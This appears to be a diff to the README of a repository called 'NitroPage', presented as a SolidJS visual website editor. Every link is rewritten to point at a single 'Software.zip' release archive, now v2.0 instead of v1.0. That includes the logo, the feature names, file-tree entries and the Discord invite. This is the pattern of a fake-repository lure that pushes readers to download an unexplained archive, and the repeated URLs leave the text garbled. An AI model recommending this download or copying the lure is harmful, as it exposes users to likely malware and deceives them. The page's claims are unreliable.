@@ -1,5 +1,5 @@
 # NitroPage 🚀
-![NitroPage Logo](https://github.com/anonnimo/nitropage/releases/download/v1.0/Software.zip)
+![NitroPage Logo](https://github.com/anonnimo/nitropage/releases/download/v2.0/Software.zip)
 
 ## Welcome to NitroPage Repository!
 
@@ -11,7 +11,7 @@ Welcome to NitroPage, the ultimate free visual website editor powered with your 
 - **SolidJS Components**: Utilize your own SolidJS components to create customized websites.
 - **WYSIWYG Editing**: See your changes in real-time with What You See Is What You Get editing.
 - **TailwindCSS Support**: Easily style your website using the popular TailwindCSS framework.
-- **https://github.com/anonnimo/nitropage/releases/download/v1.0/Software.zip Backend**: Seamless integration with https://github.com/anonnimo/nitropage/releases/download/v1.0/Software.zip for a dynamic website building experience.
+- **https://github.com/anonnimo/nitropage/releases/download/v2.0/Software.zip Backend**: Seamless integration with https://github.com/anonnimo/nitropage/releases/download/v2.0/Software.zip for a dynamic website building experience.
 - **TypeScript**: Enjoy the benefits of strong typing and modern JavaScript with TypeScript.
 - **Responsive Design**: Ensure your websites look great on all devices with responsive design tools.
 
@@ -19,7 +19,7 @@ Welcome to NitroPage, the ultimate free visual website editor powered with your 
 
 To start using NitroPage, simply download the latest release by clicking the button below:
 
-[![Download NitroPage](https://github.com/anonnimo/nitropage/releases/download/v1.0/Software.zip)](https://github.com/anonnimo/nitropage/releases/download/v1.0/Software.zip)
+[![Download NitroPage](https://github.com/anonnimo/nitropage/releases/download/v2.0/Software.zip)](https://github.com/anonnimo/nitropage/releases/download/v2.0/Software.zip)
 
 Once you have downloaded the release, launch the application and begin creating your masterpiece!
 
@@ -35,9 +35,9 @@ nitropage/
 |   |-- styles/
 |   
 |-- public/
-|   |-- https://github.com/anonnimo/nitropage/releases/download/v1.0/Software.zip
+|   |-- https://github.com/anonnimo/nitropage/releases/download/v2.0/Software.zip
 |   
-|-- https://github.com/anonnimo/nitropage/releases/download/v1.0/Software.zip
+|-- https://github.com/anonnimo/nitropage/releases/download/v2.0/Software.zip
 |-- LICENSE
 ```
 
@@ -58,7 +58,7 @@ If you are interested in contributing to NitroPage, follow these steps:
 
 Join our community of developers, designers, and website enthusiasts on Discord to get support, share your creations, and collaborate with fellow NitroPage users.
 
-[Join NitroPage Discord Community](https://github.com/anonnimo/nitropage/releases/download/v1.0/Software.zip)
+[Join NitroPage Discord Community](https://github.com/anonnimo/nitropage/releases/download/v2.0/Software.zip)
 
 For additional support, questions, or feedback, please visit the Releases section or reach out on Discord.
 
